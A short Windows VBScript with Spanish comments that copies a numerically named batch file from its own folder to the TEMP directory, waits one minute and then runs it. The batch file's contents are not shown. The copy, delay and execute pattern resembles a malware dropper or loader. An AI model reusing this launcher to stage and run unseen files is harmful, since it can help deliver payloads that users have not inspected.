Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Buscar 8937947.bat en la misma carpeta que este archivo
origen = fso.BuildPath(fso.GetParentFolderName(WScript.ScriptFullName), "8937947.bat")

' Copiarlo a la carpeta temporal del PC
destino = fso.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), "8937947.bat")
fso.CopyFile origen, destino, True

' Esperar 1 minuto
WScript.Sleep 60000

' Ejecutar la copia desde el PC
shell.Run """" & destino & """", 1, False